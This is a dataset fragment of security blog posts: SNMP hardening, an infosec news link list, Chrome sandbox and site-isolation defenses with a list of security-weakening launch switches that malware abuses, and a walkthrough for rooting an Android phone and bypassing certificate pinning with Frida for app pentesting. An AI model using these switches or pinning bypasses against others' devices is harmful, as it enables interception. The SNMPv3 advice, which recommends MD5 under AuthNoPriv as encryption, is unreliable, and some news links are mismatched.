SNMP.\n\nFirst and foremost, if you\u2019re not explicitly using SNMP then you should disable it wherever possible. If you are intentionally using it, then make sure you change the default community strings and use something other than \u2018public\u2019 and \u2018private\u2019. Using something unique and difficult to guess will make it harder for an attacker to gain access to SNMP on your network.\n\nAdditionally, you can block access to ports 161 and 162 at either a firewall or an Access Control List (ACL). This will allow your authorized systems to still access your SNMP enable devices while preventing an attacker from gaining access to SNMP. Unless of course, they have compromised one of your authorized systems in which case, you likely have bigger issues to worry about than SNMP, but that\u2019s a topic for another day.\n\nFinally, instead of using SNMPv1 or SNMPv2c, consider using SNMPv3 with the AuthNoPriv mode to encrypt authentication credentials and configure it to use MD5 and SHA for extra security.\n\nIn conclusion, SNMP is a valuable tool for network administrators, but it can also be abused by attackers. By taking the necessary security measures and monitoring the network, organizations can protect themselves against SNMP abuse and ensure the integrity and availability of their networks.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Talkin' About Infosec News - 12/21/2022\"\nTaxonomies: \"Informational\"\nCreation Date: \"Wed, 21 Dec 2022 18:29:44 +0000\"\n\nhttps://youtu.be/aUJnS3Wh4OQ\n\n00:00 - PreShow Banter\u2122 \u2014 Talkin\u2019 Bout [Elon] News00:51 - BHIS - Talkin\u2019 Bout [infosec] News 2022-12-1902:46 - Story # 1: Antivirus and EDR solutions tricked into acting as data wipershttps://www.bleepingcomputer.com/news/security/antivirus-and-edr-solutions-tricked-into-acting-as-data-wipers/12:11 - Story # 2: Twitter suspends @ElonJet after Musk promises not to ban ithttps://www.theverge.com/2022/12/14/23508898/elonjet-twitter-ban-elon-musk-jet-tracker12:48 - Story # 2b: Elon Musk starts banning critical journalists from Twitterhttps://www.theverge.com/2022/12/15/23512004/elon-musk-starts-banning-critical-journalists-from-twitter14:37 - Story # 2c: Twitter abruptly bans all links to Instagram, Mastodon, and other competitorshttps://www.theverge.com/2022/12/18/23515221/twitter-bans-links-instagram-mastodon-competitors15:08 - Story # 2d: Elon Musk should step down as head of Twitter, says pollhttps://www.theverge.com/2022/12/18/23515764/elon-musk-head-twit-poll-tesla-doxxing-moderation16:18 - Story # 2e: Your Car is Trackable by Lawhttps://medium.com/@doctoreww/day-2-your-car-is-trackable-by-law-1d5f7438885022:41 - Story # 2f: AirNav RadarBox FlightStick - ADS-B USB Receiver with Integrated Filter, Amplifier and ESD Protectionhttps://www.amazon.com/AirNav-RadarBox-FlightStick-Advanced-Receiver/dp/B07K47P7XD/26:41 - Story # 3: FBI\u2019s Vetted Info-Sharing Network \u2018InfraGard\u2019 Hackedhttps://krebsonsecurity.com/2022/12/fbis-vetted-info-sharing-network-infragard-hacked/32:24 - Story # 4: Reno mayor sues after finding tracking device on vehiclehttps://apnews.com/article/lawsuits-reno-34940c636465c050f2e0ebd2d9d119af36:43 - Story # 5: Email hijackers scam food out of businesses, not just moneyhttps://www.theregister.com/2022/12/17/in_brief_security/42:46 - Story # 6: Bugs in LEGO Resale Site Allowed Hackers to Hijack Accountshttps://www.pcmag.com/news/bugs-in-lego-resale-site-allowed-hackers-to-hijack-accounts45:41 - Story # 7: CISA Alert: Veeam Backup and Replication Vulnerabilities Being Exploited in Attackshttps://www.cyberscoop.com/apt28-fancy-bear-satellite/50:05 - Story # 8: CISA researchers: Russia\u2019s Fancy Bear infiltrated US satellite networkhttps://thehackernews.com/2022/12/cisa-alert-veeam-backup-and-replication.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"<strong>Forward into 2023: Browser and O/S Security Features</strong>\"\nTaxonomies: \"General InfoSec Tips & Tricks, Informational, Joff Thyer, Red Team, Web App\"\nCreation Date: \"Wed, 18 Jan 2023 16:38:12 +0000\"\nJoff Thyer //\n\nIntroduction\n\nWe have already arrived at the end of 2022; wow, that was fast. As with any industry or aspect of life, we find ourselves peering into 2023 and wondering in which direction the information security landscape will evolve. As I contemplated this idea today, I thought I would write down a few introspective thoughts myself.\n\nFirstly, the traditional security perimeter stack has evolved dramatically. We live in a world where the archaic concentric circles model \u2014 aka the moat around the castle \u2014 has completely dissolved. Anywhere from cloud migration to highly functional apps delivered directly in the browser, to end-user enabled shadow IT, zero trust security models, and so on has resulted in a complete rethinking of boundaries, along with a considerable amount of anxiety of behalf of security professionals. Just where is our data? How well is it protected? Are the dev-ops engineers trained well enough to keep security front of mind in an agile delivery world? Do all these cloud providers give us the right tools to secure our organization?\n\nWe must all adapt to these challenges through change. Holding onto an illusion of control through the castle and moat model is a fool\u2019s errand. While I could write about the plethora of information security implications that this rapidly evolving model has introduced, I wish to focus for now on the commonly used Windows workstation endpoint.\n\nWith the endpoint we have seen a dramatic improvement in the deployed security technologies that protect the operating system itself. The endpoint/extended detection and response (EDR/XDR) software capabilities have matured significantly, making both initial compromise and post exploitation activities on the Windows endpoint extraordinarily challenging assuming mature deployment and tuning.\n\nWhile I think we can all agree this is fabulous news for the industry, we should ask ourselves whether maximizing desktop O/S protections still matters as much as it used to. Otherwise said, we must concede that the web browser is where critical business data is increasingly being managed.\n\nThe natural corollary question is whether sufficient security technologies are deployed in the browser. Do these protections rival the O/S deployed protections? Are these protections integrated with the O/S level defensive deployments?\n\nGoogle Chrome and Chromium Project\n\nLet\u2019s start with the web browser market share1. Google Chrome clearly leads the pack in adoption. There are additionally browsers based on Google\u2019s Chromium project, such as Opera and Microsoft Edge, which notably holds second place to Chrome. From this data, we can conclude that any security vulnerabilities in the Chromium open-source project will be very significant and that proprietary security-related code in the Chrome and Edge browsers is also critically important.\n\nWeb Browser Market Share \n\nGiven this backdrop, what security features are implemented in Chrome and Chromium that help defend the browser and its user2?  \n\nThe team at Google have created a security architecture3 diagram which does a pretty good job of identifying the attack surfaces from a process level perspective below4. The major target areas of concern are the browser process and the renderer processes. \n\nChrome Security Architecture from Process Perspective \n\nGiven the browser architecture landscape and process level concerns above, let's break down some of the protective technologies that have been authored in response to browser security concerns. Please note that much of the below information has been researched and somewhat paraphrased from Google blogs and design documents available online. There are several key architectural foundations and features in the Chrome/Chromium browser effort that are relevant. \n\nThe Renderer Sandbox \n\nSite Isolation (Spectre Mitigation) \n\nThe V8 (JavaScript) Sandbox (Heap Exploit Mitigations) \n\nImproving Memory Safety \n\nUser facing security controls \n\nRenderer Sandbox \n\nThe Chromium project renderer sandbox5 adheres to sound foundational security principles. As earlier stated, I will keep this discussion in the context of the Windows desktop. These principles include: \n\nNot reinventing the wheel. Let the operating system apply its security to the objects it controls.  \n\nPrinciple of least privilege applied both to the sandboxed code and the code that runs the sandbox itself. \n\nAlways assume the sandboxed code is malicious. \n\nMinimize performance impact. \n\nNo use of emulation, code translation, or patching to provide security. \n\nThe Windows architecture is a user mode implementation. There are no supporting kernel drivers to date. The sandbox architecture breaks down into two processes: a broker process and a target process. The broker is the supervisor of the target processes doing the actual work. \n\nBroker Process \n\nBroker process responsibilities are to: \n\nSpecify a policy for each target process. Sandbox target interceptions are evaluated against this policy when received (see below)\n\nSpawn the target processes \n\nHost the sandbox policy engine and interception manager \n\nHost the sandbox IPC service for target processes \n\nPerform policy-allowed actions on behalf of target processes \n\nTarget Process \n\nThe target processes are the actual renderers themselves. Responsibilities include: \n\nHost the code to be sandboxed \n\nRun the sandbox IPC client for messaging \n\nBe the sandbox policy engine client \n\nPerform sandbox interceptions. Note that interceptions are how Windows API calls are forwarded via the sandbox IPC to the broker\n\nSandbox Process Architecture\n\nThe Sandbox Restrictions \n\nThe renderer sandbox depends on the protections provided by the Windows operating system which include the use of: \n\nA highly restricted security token which implements group restrictions, has no specific privileges, and uses the \u201cUntrusted integrity level.\u201d The Untrusted integrity level can only write to resources which have a null DACL or an explicit Mandatory Integrity Control (MIC) level of Untrusted. \n\nA Windows job object for target processes which implements numerous restrictions including: \n\nProhibits per-use system wide changes \n\nProhibits creating or switching Windows desktops \n\nProhibits changes to display settings \n\nProhibits clipboard access \n\nProhibits Windows message broadcasts \n\nProhibits setting global hooks via the SetWindowsHookEx() API call. \n\nProhibits access to the atom table \n\nProhibits access to user handles outside of the job object \n\nLimits to one active process (no child process creation allowed) \n\nThe Windows desktop object: The sandbox creates an additional desktop that is associated to all target processes. This desktop is never visible or interactive and effectively isolates the sandboxed processes from snooping the user's interaction and from sending messages to windows that are operating at more privileged contexts.  \n\nSite Isolation \n\nSite isolation was an effort to completely re-architecture the browser security model to align it more closely with operating system process security boundaries6,7. The site isolation project was a response to both act as a second line of defense for successful attacks against the rendering engine and to mitigate CPU speculative execution memory leakage attacks (Spectre8). For transient execution attacks, mitigation strategies were considered including: \n\nThe removal of precise timers, which was harmful to the operational aspect of the platform\n\nImplementation of compiler/runtime scanning mitigations, which were deemed impractical \n\nKeeping data isolated/out of reach, which is ultimately what site isolation achieves\n\nThe \u201cSite\u201d concept is not as granular as the \u201cOrigin\u201d concept. An Origin consists of the protocol scheme, the host name, and port. A Site on the other hand is defined by the effective top-level domain (eTLD), plus the domain portion just before it, also known as eTLD+1. Note: since there is no algorithmic method for determining the domain suffixes in an eTLD, a public suffix list is now maintained (https://github.com/publicsuffix/list).\n\nOrigin Example\n\nSite Example 1\n\nSite Example 2\n\nThe V8 (JavaScript/WASM) Sandbox \n\nSince mid-2020, Google\u2019s open-source JavaScript/Web Assembly engine (V8) has implemented a pointer compression for heap management9. This means that every reference from an object in the V8 heap to another object in the V8 heap becomes a 32-bit offset from the base of the heap.  \n\nCompressed pointers are thus valid only within a 4GB memory range, which is called a pointer compression cage. The majority of vulnerabilities which can be exploited to corrupt memory will thus only be able to corrupt within this compression cage. \n\nThere exist a few objects with raw (absolute) pointers to objects outside of the heap (off-heap). An attacker can target these few objects (typically an Array Buffer or typed Array backing store pointer) to corrupt memory outside of the heap which is, of course, sub-optimal and can result in code execution. \n\nThe V8 Sandbox project objective is to protect these remaining few objects in a way that also prevents attacker abuse. In summary, this design achieves the goal as follows: \n\nA large 1TB region of memory (the sandbox) is reserved during initialization. This region of memory contains the pointer compression cage as well as storage for the array backing stores and other objects. \n\nAll objects inside this sandbox, but outside of V8 heaps, are addressed using 40-bit fixed size offsets instead of raw pointers. \n\nAny remaining \u201coff-heap\u201d objects must be referenced through an external pointer table which contains the actual pointer and object type information to additionally help defend against type-confusion style attacks. \n\nImproving Memory Safety \n\nDuring 2020, the Chromium project studied and published that over 70% of their high severity security defects were memory-safety related, with over half of these being of the \u201cuse after free\u201d variety. Quite specifically this translates into mistakes with pointers in the C/C++ languages, which cause memory to be misinterpreted. It almost goes without saying that this one issue is a plague that has affected the software industry in general for decades. \n\nChrome has been exploring avenues to address this, including: \n\nMaking C/C++ safer via compile time checks on pointer correctness\n\nMaking C/C++ safer through runtime checks on pointer correctness \n\nInvestigating the use of a memory safe language for parts of the Chromium codebase\n\nIn terms of C/C++ safety, the project has explored the use of \u201cMiracle Pointers\u201d10 which is really just a term for a class of algorithms that wrap pointer use in templated memory safe C/C++ classes. The object of these implementations is to eliminate the largest \u201cuse after free\u201d type of vulnerabilities. \n\nIn terms of a memory safe language implementation, the team has been exploring Rust as a potential alternative for parts of the codebase.  \n\nUser-Facing Security Controls\n\nChrome ships with a number of user facing security features that can help mitigate the risk of an initial browser exploitation attempt. These include: \n\nSafe Browsing: a block list that warns you about potentially malicious sites. \n\nPredictive Phishing Protection: scans pages to see if they match known fake or malicious sites. \n\nIncognito Mode: also known as private browsing mode. All browsing history and cookies will be deleted at the end of an incognito mode session. The browser will also not remember any information entered into forms or permissions granted to websites. \n\nSafety Check: a user driven \u201csecurity checkup\u201d audit on the browser. Safety check runs through a series of basic checks for you such as: \n\nIs the Chrome software fully up to date? \n\nHave any of your saved passwords been compromised in public breaches? \n\nIs the Safe Browsing feature enabled? \n\nDo you have any harmful extensions enabled? \n\nIs there any known harmful software that you have downloaded?\n\n Automatic Updates: Chrome will notify if a software update is available. \n\nChrome Extensions \n\nChrome extensions are used to add additional features and functionality to the browser11. Extensions are authored with the same technologies that websites use, these being: \n\nHTML for content markup \n\nCSS for content styling \n\nJavaScript for scripting logic \n\nThere is an additional emerging technology that extensions can leverage called WebAssembly (Wasm). WebAssembly is a binary instruction format for a stack-based virtual machine that can be executed in the same context of the JavaScript engine in the browser. Google\u2019s V8 implementation is in fact both a WebAssembly and JavaScript engine. \n\nWebAssembly aims to operate at near native performance levels by taking advantage of hardware capabilities of the target platform. Because it is a binary instruction format, different high-level languages can be compiled to WebAssembly assuming a relevant compiler has been authored. \n\nExtensions can use all the JavaScript APIs that the browser provides, as well as gain access to Chrome APIs. This additional level of access to the Chrome APIs allows things like: \n\nChanging the functionality or behavior of a website \n\nCollecting information across different websites \n\nAdding features to Chrome development tools \n\nExtensions can be broken down into two components: a content presentation component and a service worker component. The service worker operates as a background task of sorts and can interact with the presentation component through messaging or browser local storage. A service worker is event driven and can use all the Chrome APIs but cannot interact directly with web content. \n\nChrome extensions are officially published in the Chrome web store. When installed, they allow the developer to request (via the MANIFEST) a great deal of power and control over your web browser. Things to consider about extensions are: \n\nA Chrome extension can read and modify web page content. \n\nA Chrome extension can access cookies, browser history, and browser data storage. \n\nA Chrome extension can transmit and receive any data across the network. \n\nA Chrome extension can exert control over other Chrome extensions. \n\nChrome extensions in the web store are not guaranteed to be malware free. \n\nWhen you install an extension, you are extending a lot of trust to the developer of that extension. \n\nChrome Command Line Switches \n\nWe are probably all used to just clicking on the Chrome icon and assuming that Chrome will start up normally, trusting that all is in order as it should. Having said this, there are several command line switches12 that can be used to change the behavior of Chrome upon startup. Some of these switches specifically disable or weaken security features of the browser, usually for testing/development purposes. \n\nI have identified the following list of switches which I have either already used experimentally, read about in malware reports, or which I suspect may present a security concern. It is not uncommon for malware to kill the Chrome process and then restart Chrome, adding in some command line switches to change the behavior of the browser, such as loading a malicious extension for example. \n\n--allow-legacy-extension-manifests \n\nallows the browser to load extensions that lack a modern manifest and would otherwise be forbidden. \n\n--allow-no-sandbox-job \n\nallows the sandboxed processes to run without a Windows job object assigned to them. This has the effect of broadening access to available Windows APIs that would not normally be available. \n\n--allow-unsecure-dlls \n\nWon\u2019t allow EnableSecureDllLoading() to run when this is set. (Probably allows you to load any unsigned DLL.)\n\n--disable-breakpad \n\nDisables crash reporting. \n\n--disable-crash-reporter \n\nDisables crash reporting in headless mode. \n\n--disable-extensions-http-throttling \n\nDisables the net::URLRequestThrottleManager() functionality for HTTP(s) requests originating from extensions. \n\n--disable-web-security \n\nDoes not enforce same site origin policy. \n\n--hide-crash-restore-bubble \n\nDisables showing the browser crash/restore bubble. \n\n--load-extension \n\nLoads an extension from disk on startup. \n\n--load-empty-dll \n\nLoads the file \u201cempty-dll.dll\u201d whenever this flag is set. \n\n--proxy-server \n\nUses the specified proxy server overriding the system proxy settings. \n\n--no-sandbox \n\nDisables the renderer sandbox completely. \n\n--restore-last-session \n\nRestores last browsing session after crash/exit. \n\n--single-process \n\nRuns the renderer and plugins in the same process as the browser. \n\nThe ChromeLoader13,14 malware is an example of using PowerShell to kill the Chrome process and then restart, loading the extension that has been dropped. \n\nConcluding Thoughts \n\nIt is very clear that Google has taken the attacks on the renderer and JavaScript engine, as well as the threat posed by speculative execution memory leakage, very seriously. As such they have implemented a robust defensive architecture that is a best effort to mitigate the risks posed.  \n\nHaving said this, the Chrome browser endpoint is a very complex software architecture. Having a dynamic compilation environment (Just-In-Time Compiler) in the areas of JavaScript \u2014 and now WebAssembly \u2014 will always suffer the potential of a logic flaw in which an attacker can force the compiler/assembler engines to emit malicious code. Continued work on heap protections in the V8 JavaScript/WebAssembly space acts as a line of defense here.  \n\nIt is likely that memory use-after-free defects will continue to be found unless the entire architecture is re-written in a memory safe language, which would frankly be a mammoth effort. I applaud the efforts to work around the edges, chipping away at the problem by proposing rewriting to a memory safe language for exposed components where it makes most sense. \n\nI also think we are likely to see more interest from the Chrome/Chromium team in the areas of Control Flow Guard15 and Control-flow Enforcement Technologies16 which further aligns the browser not only with the Windows operating system security defenses, but also with CPU hardware. \n\nLastly, as with much of the past decade in information security, you cannot predict what an end user will do. If the end user downloads malware that in turn drops a malicious extension and script to silently restart the browser, the power granted by the extension over the browser exposes a significant attack surface. I question whether there is a legitimate operational use case for many of these command line switches to exist in the release version of Chrome and would suggest perhaps that the release version eliminate much of this capability to further reduce the attack surface. \n\nHappy New Year, and Happy Safer Browsing in 2023. \n\nReferences\n\n[1] https://gs.statcounter.com/browser-market-share \n\n[2] https://security.googleblog.com/2022/03/\n\n[3] http://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf \n\n[4] https://www.chromium.org/Home/chromium-security/guts/\n\n[5] https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md\n\n[6] https://www.usenix.org/conference/usenixsecurity19/presentation/reis\n\n[7] https://www.chromium.org/developers/design-documents/site-isolation/ \n\n[8] https://spectreattack.com/spectre.pdf\n\n[9] https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit\n\n[10] https://chromium.googlesource.com/chromium/src/+/ddc017f9569973a731a574be4199d8400616f5a5/base/memory/raw_ptr.md \n\n[11] https://developer.chrome.com/docs/extensions/\n\n[12] https://peter.sh/experiments/chromium-command-line-switches/\n\n[13] https://unit42.paloaltonetworks.com/chromeloader-malware/ \n\n[14] https://blogs.vmware.com/security/2022/09/the-evolution-of-the-chromeloader-malware.html\n\n[15] https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard \n\n[16] https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Start to Finish: Configuring an Android Phone for Pentesting\"\nTaxonomies: \"How-To, Mobile, Android, android hacking, mobile hacking, penetration testing, Pentesting, walkthrough\"\nCreation Date: \"Wed, 25 Jan 2023 15:26:43 +0000\"\nJeff Barbi // *Guest Post\n\nBackground\n\nUnless you're pentesting mobile apps consistently, it's easy for your methodologies to fall out of date. Each new version of Android brings with it additional security features to bypass, making the process you used three years ago to set up your testing device obsolete.\n\nIf you're like me, instead of documenting how you set up your last phone, you re-discover a new process each time you configure one. This is redundant and silly. Worse, the information is scattered across the internet in code repos, blogs, and forum threads. Worse still, much of this info is outdated and no longer works.\n\nWhat follows is an attempt to save others time in the future by documenting a known-good process for Android 12 at the time of writing (October 2022).\n\nI took a factory non-rooted Pixel 4A running a recent stable version of Android 12 \"snow cone\" and documented the steps required to configure it for pentesting, start to finish. This includes defeating certificate pinning, which is becoming more and more common. At the start of each section, I include the tools required and where to get them.\n\nThe order of operations we'll take is as follows:\n\nEnable developer mode, boot loader unlocking, and USB debugging\n\nUnlock the boot loader\n\nUse Magisk to modify a factory boot image\n\nFlash this new image to the bootloader, rooting the phone\n\nConvert the Burp certificate to a format Android expects\n\nInstall the Burp cert as a trusted CA, using a custom Magisk Module Template installer\n\nInstall & run Frida server on the phone\n\nConnect Frida server agent with Runtime Mobile Security frontend\n\nRun our target app in a hooked process via RMS\n\nUse a custom RMS plugin to bypass cert pinning\n\nI'm starting with a factory-original, out-of-the-box phone:\n\nI followed the prompts to join Wi-Fi, log into a Google account, accept the ToS, etc.\n\nNOTE: My host machine for this walkthrough was running a Debian-based Linux distro. The steps should work on other distros and/or OSX, but some of the syntax may be different.\n\nRooting the phone\n\nTools required\n\nAndroid Debug Bridge (adb)\n\n# apt install adb\n\nhttps://developer.android.com/studio/releases/platform-tools#downloads\n\nfastboot\n\n# apt install fastboot\n\nhttps://developer.android.com/studio/releases/platform-tools.html#downloads\n\nNote: Package repos like apt will have older versions of these tools. They may work, but I used the ones from the developer site.\n\nUnlocking the boot loader\n\nIf we want to install the Burp cert, Frida, defeat certificate pinning etc. then we need to root our phone. This involves writing a modified boot image to the phone's boot loader. To do that, we need to unlock it.\n\nEnable developer mode\n\nGo to Settings -> About phone. Tap on \"Build number\" 7 times. After entering your PIN, you will see this \u201cYou are now a developer!\u201d message:\n\nEnable USB debugging & OEM unlocking\n\nGo to Settings -> System -> Advanced, and you will see a new item, \"Developer options.\"\n\nIn the dev options menu, toggle on \"OEM unlocking\" and you will see a warning:\n\nConfirm OK and your boot loader is unlocked.\n\nToggle on USB debugging, you will see another warning:\n\nChoose OK.\n\nTest adb\n\nNow that USB debugging is enabled, we can use adb and fastboot.\n\nPlug the phone into the computer and confirm adb can connect to the phone:\n\n$ adb devices -l\nList of devices attached\n13011JEC204262 device usb:5-1.4 product:sunfish model:Pixel_4a device:sunfish transport_id:2\n\nThen use adb to reboot into fastboot mode:\n\n$ adb reboot bootloader\n\nThe phone will reboot, and we can now run fastboot commands on the phone.\n\nCheck that fastboot can connect to the phone:\n\n$ fastboot devices\n13011JEC204262 fastboot\n\nNow we can unlock the bootloader:\n\n$ fastboot flashing unlock\nOKAY [ 0.104s]\nFinished. Total time: 0.104s\n\nThe warning screen will change and \"Do not lock the bootloader\" is selected by default. Hit the volume up key to select \"Unlock the bootloader,\" then hit the lock button.\n\nThe phone will reboot back into fastboot mode. Hit the lock button, and the phone will reboot again. The boot loader is now unlocked.\n\nWhen the phone boots, follow the prompts again to join Wi-Fi, log into a Google account, etc.\n\nEnabling USB debugging (again)\n\nUnlocking the boot loader resets the phone, disabling developer mode and USB debugging along with it. Re-enable these the same way as before:\n\n- Settings -> About phone. Tap on \"Build number\" 7 times, then enter the PIN.\n\n- Settings -> System -> Advanced and enter the \"Developer options\" menu. Toggle on \"USB debugging.\"\n\nReboot the phone. Hit allow on the warning prompt:\n\nInstalling the Magisk app\n\nDownload the Magisk app as an APK file here: https://github.com/topjohnwu/Magisk/releases/latest\n\nThen use adb to install the app:\n\n$ adb devices -l \nList of devices attached\n13011JEC204262 device usb:5-1.4 product:sunfish model:Pixel_4a device:sunfish transport_id:4\n\n$ adb install Magisk-v25.2.apk \nPerforming Streamed Install\nSuccess\n\nModifying a boot image with Magisk\n\nMagisk can modify a factory boot image for us, which we'll write to the boot loader and root the phone.\n\nIMPORTANT: modifying boot images is done differently on different phones. What follows is for a Pixel 4A and other Google phones using the same partition scheme. Specific steps for phones from other vendors are described in detail here: https://www.xda-developers.com/how-to-install-magisk/\n\nBoot images for Nexus and Pixel devices are available here: https://developers.google.com/android/images\n\nSince I'm using a Pixel 4A and Android 12, I downloaded the android 12.1.0 \"sunfish\" image:https://developers.google.com/android/images#sunfish\n\nHere is a direct link to the image: https://dl.google.com/dl/android/aosp/sunfish-sq3a.220705.003.a1-factory-c1963f71.zip\n\nIMPORTANT: for the rest of this step, it's critical that the image you downloaded matches the version of Android on the phone.\n\nPatch the image\n\nExtract the zip file, and then the boot image:\n\n$ unzip -p sunfish*.zip */*.zip >image.zip\n$ unzip -p image.zip boot.img >boot.img\n$ file boot.img\nboot.img: Android bootimg, kernel (0x8000), ramdisk (0x1000000), page size: 4096, cmdline (console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.ena)\n\nUse adb to push this file to the phone. I chose the Download directory because it's easy to find in Magisk:\n\n$ adb push boot.img /storage/self/primary/Download\nboot.img: 1 file pushed, 0 skipped. 24.2 MB/s (67108864 bytes in 2.644s)\n\nNow open the Magisk app and choose Install:\n\nThen \"Select and patch a file:\"\n\nThen \"Let's Go.\" You will see install log output and the file will be written to the same directory as the original file:\n\nUse adb to pull the new file off the phone (you can use tab completion, the filename will start with \"magisk_patched\"):\n\n$ adb pull /storage/self/primary/Download/magisk_patched-25200_VEmzX.img\n/storage/self/primary/Download/magisk_patched-2...0 skipped. 36.6 MB/s (67108864 bytes in 1.748s)\n\nNow we have a rooted boot.img file, ready to write to the bootloader.\n\nWrite the patched image\n\nAll that's left is to write our patched image to the boot loader.\n\nWrite the image with fastboot\n\nReboot the phone into fastboot mode:\n\n$ adb reboot bootloader\n$ fastboot flash boot magisk_patched-25200_VEmzX.img\nSending 'boot_b' (65536 KB) OKAY [ 1.930s]\nWriting 'boot_b' OKAY [ 0.306s]\nFinished. Total time: 2.459s\n\nVerify root\n\nWhen the phone reboots, it should now be rooted. We can verify this with adb:\n\n$ adb shell\nsunfish:/ su root\n\nA warning prompt should appear on the phone:\n\nAccept this prompt and the process should allow root:\n\nsunfish:/ # id\nuid=0(root) gid=0(root) groups=0(root) context=u:r:magisk:s0\n\nInstalling the Burp cert\n\nIntercepting requests with Burp breaks the TLS certificate chain. Without a root of trust, TLS will not work and we cannot dynamically test the app with Burp.\n\nExport & convert the cert\n\nNote: steps below partially taken from here: https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/\n\nFirst, launch Burp. Then export the certificate:\n\n$ curl http://burp/cert -x localhost:8080 > /tmp/cacert.der\n\nThen convert it from DER to PEM format:\n\n$ openssl x509 -inform DER -in /tmp/cacert.der -out /tmp/cacert.pem\n\nAndroid certs are named using the hash value of the file. Rename cacert.pem to this format:\n\n$ HASH=$(openssl x509 -inform PEM -subject_hash_old -in /tmp/cacert.pem | head -1)\n$ mv /tmp/cacert.pem /tmp/$HASH.0\n\nNow we are ready to copy the cert to the phone.\n\nCreate a module with MMT\n\nOn earlier versions of Android, we could simply write the cert to the phone at this point and be finished. More recent versions of Android use a different partitioning scheme, making it more difficult to mount the /system partition as writable on a rooted phone. Commands like mount -o remount,rw /system no longer work, even as the root user.\n\nFor this reason, we will use Magisk Module Template Extended (MMT-Ex) to write the Burp cert to the phone. MMT automates the installation of Magisk modules, and we can use it to help install our cert.\n\nNote: The below steps are taken loosely from here: https://github.com/Zackptg5/MMT-Extended/wiki\n\nClone the repo:\n\n$ git clone https://github.com/Zackptg5/MMT-Extended\n\nNow, we will create the directory structure that MMT will recreate on the phone when our module is run:\n\n$ cd MMT-Extended\n$ mkdir -p ./system/etc/security\n$ rm -rf ./zygisk\n$ rm ./system/placeholder\n$ cd ./system/etc/security\n\nThen copy the existing certs from the phone into this directory, so they are not removed when the module is run:\n\n$ adb pull /system/etc/security/cacerts/ .\n\n...and add the Burp cert:\n\n$ cp /tmp/$HASH.0 ./cacerts/\n\nThe file customize.sh is essentially a setup script for our module. For example, any filesystem permissions configured here will be matched on the device when the module installs. This way we can make sure our new certificate has the same file permissions as the rest of the certs on the phone.\n\nModify customize.sh, replacing the REPLACE variable on line 36 according to the example in the file:\n\n$ cd ../../../\n$ vim customize.sh\n\nMake the following replacements/additions in the file (follow the examples):\n\nREPLACE=\"\n/system/etc/security/cacerts\n\"\n\nset_perm_recursive $MODPATH/system/etc/security/cacerts 0 0 0755 0644\n\nZip up the module and push it to the phone:\n\n$ zip -9 -r MMT.zip .\n$ adb push MMT.zip /storage/self/primary/Download/\n\nInstall the module in Magisk\n\nBefore installing the module, we need to enable Zygisk. Open the Magisk app, and hit the settings icon on the top right. Toggle on \"Zygisk: run parts of Magisk in the zygote daemon:\"\n\nReboot the phone.\n\nOpen the Magisk app and navigate to Modules -> Install from storage:\n\nChoose the zip file and Magisk will install it as a module:\n\nReboot the phone again.\n\nTo verify the cert is now trusted, navigate to Settings -> Security -> Encryption & credentials. You should have a Portswigger entry:\n\nProxying traffic over USB\n\nWith the Burp cert installed and trusted, we can intercept traffic from running apps.\n\nMake sure adb is running and connected to the phone. Then start a reverse proxy, which will route a given local port on the phone to a given local port on the host computer. Burp listens on 8080 by default, so we'll use that:\n\n$ adb devices -l\nList of devices attached\n13011JEC204262 device usb:5-1.4 product:sunfish model:Pixel_4a device:sunfish transport_id:1\n\n$ adb reverse tcp:8080 tcp:8080\n8080\n\nNow set the phone's network connection to use local port 8080:\n\nSettings -> Network & internet -> Internet -> your SSID -> edit button in the top right\n\nApp traffic should now route through the Burp listener.\n\nBypassing cert pinning\n\nCert pinning is a way to ensure that not only is a host's certificate valid, but it is the expected one for that host. No other certificate will work, even if it is a valid, signed, trusted cert.\n\nThis is becoming more and more common, and presents an extra hurdle for us to get around if we want to proxy and analyze app traffic.\n\nTools required\n\nFrida tools\n\n$ pip install frida-tools\n\nhttps://frida.re/docs/installation/\n\nnodeJS & npm\n\n# apt install nodejs\n\n# apt install npm\n\nhttps://nodejs.org/en/download/\n\nhttps://docs.npmjs.com/downloading-and-installing-node-js-and-npm\n\nRuntime Mobile Security (RMS)\n\n# npm install -g rms-runtime-mobile-security\n\nhttps://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security\n\nUsing RMS\n\nRMS is a web interface which uses Frida to provide debugging features & manipulation tools at runtime: https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security\n\nFrida uses Google's V8 engine to run JavaScript in a hooked process. This enables us to interact with functions and modify their behavior; for example, changing the return value of TLS checks. We can use this to defeat roadblocks such as a broken certificate chain or to bypass cert pinning.\n\nInstall Frida server\n\nAt this point, I experienced the issue discussed here: https://github.com/frida/frida/issues/2176#issuecomment-1262135111\n\nSo I uninstalled com.google.android.art as shown in the comment:\n\nsunfish:/ pm path com.google.android.art\npackage:/data/apex/active/com.android.art@330443060.apex\n\nsunfish:/ pm uninstall com.google.android.art\nSuccess\n\nI then rebooted the phone and I was able to install Frida server. This will probably be patched in future versions of Frida (I am using 15.2.2 at the time of writing).\n\nIt is important that both the Frida client and server versions match.\n\nCheck which version of Frida client was installed with Frida-tools. Download this version of Frida server from the Frida git repo. Then unxz the file, and push it to the phone:\n\n$ frida-ps --version \n15.2.2\n$wget -q https://github.com/frida/frida/releases/download/15.2.2/frida-server-15.2.2-android-arm64.xz\n$ unxz frida-server-15.2.2-android-arm64.xz \n$ adb push frida-server-15.2.2-android-arm64 /data/local/tmp \nfrida-server-15.2.2-android-arm64: 1 file pushed, 0 skipped. 71.0 MB/s (47188552 bytes in 0.634s) \n\nNOTE: Each Frida release includes many related tools with builds for various architectures. Make sure to get the Frida server for the architecture of the device you are using.\n\nNow connect to the phone and start Frida server:\n\n$ adb shell \nsunfish:/ $ cd /data/local/tmp \nsunfish:/data/local/tmp $ su root 